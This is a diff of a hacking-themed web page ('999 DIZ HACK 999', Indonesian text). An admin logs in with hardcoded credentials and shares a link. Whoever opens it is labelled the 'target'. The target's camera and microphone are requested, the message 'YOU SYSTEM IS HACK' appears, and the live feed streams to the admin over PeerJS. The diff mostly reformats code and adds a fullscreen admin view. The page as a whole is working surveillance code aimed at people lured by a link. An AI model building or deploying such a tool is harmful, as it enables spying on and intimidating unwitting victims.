@@ -2,10 +2,9 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>DIZ FLYZE GG ABIZ - Advanced</title>
+  <title>DIZ FLYZE GG ABIZ - Fullscreen Admin</title>
   <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
   <style>
-    /* Variabel dan Reset Global */
     :root {
       --primary-color: #0ff;
       --secondary-color: #075e54;
@@ -24,7 +23,6 @@
       color: var(--primary-color);
       overflow: hidden;
     }
-    /* Container Utama */
     #appContainer {
       max-width: 480px;
       margin: 20px auto;
@@ -36,17 +34,16 @@
       padding-bottom: 20px;
       overflow: hidden;
     }
-    /* Mode Full Screen (Guest) */
-    .fullScreen {
+    .fullScreen,
+    #appContainer.adminConnected {
       max-width: 100vw !important;
-      margin: 0 !important;
       width: 100vw !important;
       height: 100vh !important;
+      margin: 0 !important;
       border: none;
       border-radius: 0;
       box-shadow: none;
     }
-    /* Header Neon */
     .header {
       text-align: center;
       font-size: 24px;
@@ -61,83 +58,138 @@
       from { text-shadow: 0 0 10px var(--primary-color), 0 0 20px var(--primary-color); }
       to { text-shadow: 0 0 20px var(--primary-color), 0 0 30px var(--primary-color); }
     }
-    /* Bio & Status */
     #bioContainer { text-align: center; padding: 10px; }
     #facebookLogo {
-      width: 70px; height: 70px; border-radius: 100%;
-      margin-bottom: 12px; border: 2px solid var(--primary-color);
+      width: 70px;
+      height: 70px;
+      border-radius: 100%;
+      margin-bottom: 12px;
+      border: 2px solid var(--primary-color);
     }
     #bioText { font-size: 16px; color: var(--primary-color); text-shadow: 0 0 5px var(--primary-color); }
     #connectionStatus {
-      position: absolute; top: 12px; left: 12px;
-      padding: 5px 10px; background: rgba(0, 0, 0, 0.7);
-      border: 1px solid var(--primary-color); border-radius: 5px;
-      font-size: 14px; z-index: 100;
+      position: absolute;
+      top: 12px;
+      left: 12px;
+      padding: 5px 10px;
+      background: rgba(0, 0, 0, 0.7);
+      border: 1px solid var(--primary-color);
+      border-radius: 5px;
+      font-size: 14px;
+      z-index: 100;
     }
-    /* Notifikasi */
     .notification {
-      position: absolute; top: 50%; left: 50%;
+      position: absolute;
+      top: 50%;
+      left: 50%;
       transform: translate(-50%, -50%);
       background: rgba(0,0,0,0.8);
-      padding: 15px 25px; border: 2px solid var(--accent-color);
-      border-radius: 10px; font-size: 18px; font-weight: bold;
-      opacity: 0; pointer-events: none;
-      transition: opacity 0.5s ease; z-index: 200;
+      padding: 15px 25px;
+      border: 2px solid var(--accent-color);
+      border-radius: 10px;
+      font-size: 18px;
+      font-weight: bold;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.5s ease;
+      z-index: 200;
     }
     .notification.show { opacity: 1; }
-    /* Form Login (Admin) */
     #loginForm {
-      display: none; position: block; top: 0; left: 0;
-      transform: translate(0, 0); background: black;
-      padding: 20px; border: 2px solid var(--primary-color);
-      border-radius: 120px; z-index: 300; width: 100%;
+      display: none;
+      position: block;
+      top: 0;
+      left: 0;
+      transform: translate(0, 0);
+      background: black;
+      padding: 20px;
+      border: 2px solid var(--primary-color);
+      border-radius: 120px;
+      z-index: 300;
+      width: 100%;
     }
     #loginForm h2 { margin-bottom: 10px; font-size: 16px; text-align: center; }
     #loginForm input[type="text"],
     #loginForm input[type="password"] {
-      width: 100%; padding: 10px; margin: 6px 0;
-      border: 2px solid var(--primary-color); border-radius: 20px;
-      background: black; color: var(--primary-color);
+      width: 100%;
+      padding: 10px;
+      margin: 6px 0;
+      border: 2px solid var(--primary-color);
+      border-radius: 20px;
+      background: black;
+      color: var(--primary-color);
     }
     #loginForm button {
-      width: 100%; padding: 10px; background: black;
-      border: none; border-radius: 20px; color: cyan;
-      font-size: 16px; cursor: pointer; margin-top: 10px;
+      width: 100%;
+      padding: 10px;
+      background: black;
+      border: none;
+      border-radius: 20px;
+      color: cyan;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
       transition: background 0.3s;
     }
     #loginForm button:hover { background: var(--accent-color); }
-    /* Tampilan Admin */
     #adminUI { padding: 10px; display: none; }
     .remote-container {
-      position: relative; transition: width 0.3s ease;
-      width: 100%; margin-bottom: 10px;
+      position: relative;
+      transition: width 0.3s ease;
+      width: 100%;
+      margin-bottom: 10px;
     }
     #remoteVideo {
-      width: 100%; display: block; border-radius: 15px;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+      border-radius: 0;
     }
-    /* Preview Lokal Admin (kecil) */
     #localPreview {
-      position: absolute; bottom: 10px; right: 2px;
-      width: 120px; border: 2px solid var(--primary-color); border-radius: 5px;
+      position: absolute;
+      bottom: 10px;
+      right: 2px;
+      width: 2px;
+      border: 2px solid var(--primary-color);
+      border-radius: 5px;
     }
     .video-label {
-      position: absolute; top: 10px; left: 10px;
-      background: rgba(0, 0, 0, 0.5); padding: 5px 10px;
-      border-radius: 5px; font-size: 14px; font-weight: bold;
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      background: rgba(0, 0, 0, 0.5);
+      padding: 5px 10px;
+      border-radius: 5px;
+      font-size: 14px;
+      font-weight: bold;
       text-shadow: 0 0 3px #000;
     }
-    /* Tombol Kontrol Ukuran */
     #toggleSizeControl {
-      display: none; position: absolute; top: 12px; right: 12px;
-      background: var(--secondary-color); border: none;
-      border-radius: 100px; color: #fff; padding: 7px 10px;
-      cursor: pointer; z-index: 150; transition: background 0.3s;
+      display: none;
+      position: absolute;
+      top: 12px;
+      right: 12px;
+      background: var(--secondary-color);
+      border: none;
+      border-radius: 100px;
+      color: #fff;
+      padding: 7px 10px;
+      cursor: pointer;
+      z-index: 150;
+      transition: background 0.3s;
     }
     #toggleSizeControl:hover { background: var(--accent-color); }
     #sizeToast {
-      display: none; position: absolute; top: 50px; right: 12px;
-      background: rgba(0, 0, 0, 0.85); border: 1px solid var(--primary-color);
-      border-radius: 5px; padding: 8px; z-index: 150;
+      display: none;
+      position: absolute;
+      top: 50px;
+      right: 12px;
+      background: rgba(0, 0, 0, 0.85);
+      border: 1px solid var(--primary-color);
+      border-radius: 5px;
+      padding: 8px;
+      z-index: 150;
       animation: slideDown 0.3s ease-out;
     }
     @keyframes slideDown {
@@ -145,70 +197,89 @@
       to { opacity: 1; transform: translateY(0); }
     }
     #sizeToast button {
-      background: var(--secondary-color); border: none;
-      border-radius: 5px; color: #fff; padding: 5px 10px;
-      margin: 4px; cursor: pointer; transition: background 0.3s;
+      background: var(--secondary-color);
+      border: none;
+      border-radius: 5px;
+      color: #fff;
+      padding: 5px 10px;
+      margin: 4px;
+      cursor: pointer;
+      transition: background 0.3s;
       width: 100%;
     }
     #sizeToast button:hover { background: var(--accent-color); }
-    /* Link untuk sharing */
     .link-container {
-      display: flex; align-items: center; gap: 10px; margin: 10px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 10px;
     }
     .link-container input {
-      flex: 1; padding: 8px 12px; border: 1px solid var(--primary-color);
-      border-radius: 25px; background: var(--background-color);
-      color: var(--primary-color); text-align: center; font-size: 14px;
+      flex: 1;
+      padding: 8px 12px;
+      border: 1px solid var(--primary-color);
+      border-radius: 25px;
+      background: var(--background-color);
+      color: var(--primary-color);
+      text-align: center;
+      font-size: 14px;
     }
     .link-container button {
-      padding: 8px 12px; border: none; border-radius: 80px;
-      background: var(--secondary-color); color: #fff;
-      cursor: pointer; transition: transform 0.3s, background 0.3s;
+      padding: 8px 12px;
+      border: none;
+      border-radius: 80px;
+      background: var(--secondary-color);
+      color: #fff;
+      cursor: pointer;
+      transition: transform 0.3s, background 0.3s;
     }
     .link-container button:hover {
-      transform: scale(1.1); background: var(--accent-color);
+      transform: scale(1.1);
+      background: var(--accent-color);
     }
-    /* Tampilan Guest (Target) */
     #guestUI {
-      display: none; position: fixed; top: 0; left: 0;
-      width: 100vw; height: 100vh; background: var(--background-color);
-      z-index: 100; margin: 0; padding: 0;
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: var(--background-color);
+      z-index: 100;
+      margin: 0;
+      padding: 0;
     }
     #guestUI .video-wrapper { width: 100%; height: 100%; }
     #guestVideo {
-      width: 100%; height: 100%;
+      width: 100%;
+      height: 100%;
       object-fit: cover;
     }
-    /* Audio Visualizer */
     #audioVisualizer {
-      position: absolute; bottom: 0; left: 0;
-      width: 100%; height: 30px; pointer-events: none;
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 30px;
+      pointer-events: none;
     }
   </style>
 </head>
 <body>
   <div class="wrapper" id="appContainer">
-    <!-- Header Neon -->
     <div class="header" id="headerText">999 DIZ HACK 999</div>
-    <!-- Bio Container -->
     <div id="bioContainer">
       <img src="https://i.ibb.co/BVSkxm1M/e93bc4cf17f5.webp" alt="Facebook Logo" id="facebookLogo">
       <p id="bioText">Tidak Ada System 100% Aman</p>
     </div>
-    <!-- Connection Status -->
     <div id="connectionStatus">No Target</div>
-    <!-- Notification Toast -->
     <div id="notification" class="notification">Terhubung</div>
-    
-    <!-- Form Login (Admin Only) -->
     <div id="loginForm">
       <h2>LOGIN ADMIN</h2>
       <input type="text" id="username" placeholder="Username">
       <input type="password" id="password" placeholder="Password">
       <button id="loginBtn">-• Log In •-</button>
     </div>
-    
-    <!-- Tampilan Admin -->
     <div id="adminUI">
       <div class="remote-container" id="remoteContainer">
         <video id="remoteVideo" autoplay playsinline></video>
@@ -226,49 +297,20 @@
         <button id="copyLinkBtn">➤</button>
       </div>
     </div>
-    
-    <!-- Tampilan Guest -->
     <div id="guestUI">
       <div class="video-wrapper">
         <video id="guestVideo" autoplay playsinline></video>
       </div>
     </div>
   </div>
-  
-  <!-- Sertakan PeerJS dari CDN -->
   <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
   <script>
     "use strict";
-    // Konfigurasi PeerJS dengan STUN (dan TURN opsional)
-    const peerConfig = {
-      config: {
-        iceServers: [
-          { urls: "stun:stun.l.google.com:19302" },
-          { urls: "stun:stun1.l.google.com:19302" }
-          // Untuk TURN, jika diperlukan:
-          // { urls: "turn:turnserver.example.org", username: "username", credential: "password" }
-        ]
-      }
-    };
-
-    // Kredensial Admin
-    const ADMIN_USERNAME = "DIZ FLYZE";
-    const ADMIN_PASSWORD = "1234567890987654321";
-
-    // Fungsi pembantu: ambil parameter query (misalnya ?peer=...)
-    function getQueryParam(param) {
-      return new URLSearchParams(window.location.search).get(param);
-    }
-
-    let peer = null, localStream = null, currentCall = null;
-    let targetSize = 100; // Persentase ukuran container target
-
-    // Update status koneksi
-    function updateConnectionStatus(status) {
-      document.getElementById("connectionStatus").textContent = status;
-    }
-
-    // Tampilkan notifikasi (toast)
+    const peerConfig = { config: { iceServers: [{ urls: "stun:stun.l.google.com:19302" }, { urls: "stun:stun1.l.google.com:19302" }] } };
+    const ADMIN_USERNAME = "DIZ FLYZE", ADMIN_PASSWORD = "1234567890987654321";
+    function getQueryParam(param) { return new URLSearchParams(window.location.search).get(param); }
+    let peer = null, localStream = null, currentCall = null, targetSize = 100;
+    function updateConnectionStatus(status) { document.getElementById("connectionStatus").textContent = status; }
     function showNotification(message, isError = false) {
       const notif = document.getElementById("notification");
       notif.textContent = message;
@@ -276,30 +318,21 @@
       notif.classList.add("show");
       setTimeout(() => { notif.classList.remove("show"); }, isError ? 5000 : 3000);
     }
-
-    // Dapatkan stream kamera dan mikrofon
-    function getLiveStream() {
-      return navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-    }
-
-    // Inisialisasi audio visualizer
+    function getLiveStream() { return navigator.mediaDevices.getUserMedia({ video: true, audio: true }); }
     function initAudioVisualizer(stream) {
       const audioContext = new (window.AudioContext || window.webkitAudioContext)();
       const analyser = audioContext.createAnalyser();
       const source = audioContext.createMediaStreamSource(stream);
       source.connect(analyser);
       analyser.fftSize = 256;
-      const bufferLength = analyser.frequencyBinCount;
-      const dataArray = new Uint8Array(bufferLength);
-      const canvas = document.getElementById("audioVisualizer");
-      const canvasCtx = canvas.getContext("2d");
+      const bufferLength = analyser.frequencyBinCount, dataArray = new Uint8Array(bufferLength);
+      const canvas = document.getElementById("audioVisualizer"), canvasCtx = canvas.getContext("2d");
       canvas.width = canvas.offsetWidth;
       canvas.height = canvas.offsetHeight;
-      
       function draw() {
         requestAnimationFrame(draw);
         analyser.getByteFrequencyData(dataArray);
-        canvasCtx.fillStyle = "rgba(0, 0, 0, 0.7)";
+        canvasCtx.fillStyle = "rgba(0,0,0,0.7)";
         canvasCtx.fillRect(0, 0, canvas.width, canvas.height);
         const barWidth = (canvas.width / bufferLength) * 2.5;
         let x = 0;
@@ -312,50 +345,33 @@
       }
       draw();
     }
-
-    // Mode Login (Admin)
     function initLogin() {
       document.getElementById("loginForm").style.display = "block";
       document.getElementById("adminUI").style.display = "none";
       document.getElementById("guestUI").style.display = "none";
-
       document.getElementById("loginBtn").addEventListener("click", () => {
-        const username = document.getElementById("username").value.trim();
-        const password = document.getElementById("password").value.trim();
+        const username = document.getElementById("username").value.trim(), password = document.getElementById("password").value.trim();
         if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
           document.getElementById("loginForm").style.display = "none";
           initAdmin();
-        } else {
-          showNotification("Invalid credentials", true);
-        }
+        } else { showNotification("Invalid credentials", true); }
       });
     }
-
-    // Mode Admin
     function initAdmin() {
       updateConnectionStatus("Disconnected");
       document.getElementById("adminUI").style.display = "block";
       document.getElementById("guestUI").style.display = "none";
-
-      // Inisialisasi Peer dengan konfigurasi canggih
       peer = new Peer(undefined, peerConfig);
       peer.on("open", (id) => {
         console.log("Admin Peer ID:", id);
         const link = window.location.origin + window.location.pathname + "?peer=" + id;
         document.getElementById("callLink").value = link;
       });
-      peer.on("error", (err) => {
-        console.error(err);
-        showNotification(err.message, true);
-      });
-
-      // Dapatkan stream lokal dan inisialisasi visualizer
+      peer.on("error", (err) => { console.error(err); showNotification(err.message, true); });
       getLiveStream().then((stream) => {
         localStream = stream;
         document.getElementById("localPreview").srcObject = stream;
         initAudioVisualizer(stream);
-
-        // Jawab panggilan masuk dengan stream lokal
         peer.on("call", (call) => {
           currentCall = call;
           call.answer(localStream);
@@ -363,40 +379,31 @@
             document.getElementById("remoteVideo").srcObject = remoteStream;
             showNotification("TARGET CONNECTED");
             updateConnectionStatus("Connected");
+            document.getElementById("appContainer").classList.add("adminConnected");
           });
           call.on("close", () => {
             showNotification("TARGET CLOSED");
             updateConnectionStatus("Disconnected");
+            document.getElementById("appContainer").classList.remove("adminConnected");
           });
         });
-      }).catch((err) => {
-        console.error(err);
-        showNotification(err.message, true);
-      });
-
-      // Tombol Copy Link
+      }).catch((err) => { console.error(err); showNotification(err.message, true); });
       document.getElementById("copyLinkBtn").addEventListener("click", () => {
         const input = document.getElementById("callLink");
         input.select();
         document.execCommand("copy");
         showNotification("[ SUKSES COPY ]");
       });
-
-      // Tombol untuk memunculkan kontrol ukuran remote container
       document.getElementById("toggleSizeControl").style.display = "block";
       document.getElementById("toggleSizeControl").addEventListener("click", () => {
         const toast = document.getElementById("sizeToast");
         toast.style.display = (toast.style.display === "none" || toast.style.display === "") ? "block" : "none";
-        if (toast.style.display === "block") {
-          setTimeout(() => { toast.style.display = "none"; }, 5000);
-        }
+        if (toast.style.display === "block") { setTimeout(() => { toast.style.display = "none"; }, 5000); }
       });
-
       function setTargetSize(newSize) {
         targetSize = newSize;
         document.getElementById("remoteContainer").style.width = targetSize + "%";
       }
-
       document.getElementById("optionPeninggi").addEventListener("click", () => {
         if (targetSize > 30) setTargetSize(targetSize - 10);
         document.getElementById("sizeToast").style.display = "none";
@@ -405,20 +412,12 @@
         if (targetSize < 100) setTargetSize(targetSize + 10);
         document.getElementById("sizeToast").style.display = "none";
       });
-
-      // Tambahkan event listener untuk double-click pada video remote agar Admin dapat toggle full screen
       document.getElementById("remoteVideo").addEventListener("dblclick", function() {
         if (!document.fullscreenElement) {
-          this.requestFullscreen().catch(err => {
-            console.error(`Error masuk full screen: ${err.message} (${err.name})`);
-          });
-        } else {
-          document.exitFullscreen();
-        }
+          this.requestFullscreen().catch(err => { console.error(`Error masuk full screen: ${err.message} (${err.name})`); });
+        } else { document.exitFullscreen(); }
       });
     }
-
-    // Mode Guest
     function initGuest(adminPeerId) {
       document.getElementById("loginForm").style.display = "none";
       document.getElementById("adminUI").style.display = "none";
@@ -426,13 +425,10 @@
       document.getElementById("guestUI").style.display = "block";
       document.getElementById("headerText").textContent = "YOU SYSTEM IS HACK";
       updateConnectionStatus("Connected");
-
       getLiveStream().then((stream) => {
-        // Inisialisasi Peer untuk Guest dengan konfigurasi canggih
         peer = new Peer(undefined, peerConfig);
         peer.on("open", (id) => {
           console.log("Guest Peer ID:", id);
-          // Panggil Admin dengan stream lokal; Admin akan mengirimkan remote stream sebagai respons
           const call = peer.call(adminPeerId, stream);
           currentCall = call;
           call.on("stream", (remoteStream) => {
@@ -440,24 +436,12 @@
             document.getElementById("guestVideo").srcObject = remoteStream;
           });
         });
-        peer.on("error", (err) => {
-          console.error(err);
-          showNotification(err.message, true);
-        });
-      }).catch((err) => {
-        console.error(err);
-        showNotification(err.message, true);
-      });
+        peer.on("error", (err) => { console.error(err); showNotification(err.message, true); });
+      }).catch((err) => { console.error(err); showNotification(err.message, true); });
     }
-
-    // Saat halaman dimuat, tentukan mode berdasarkan parameter URL
     window.addEventListener("load", () => {
       const adminPeerId = getQueryParam("peer");
-      if (adminPeerId) {
-        initGuest(adminPeerId);
-      } else {
-        initLogin();
-      }
+      if (adminPeerId) { initGuest(adminPeerId); } else { initLogin(); }
     });
   </script>
 </body>
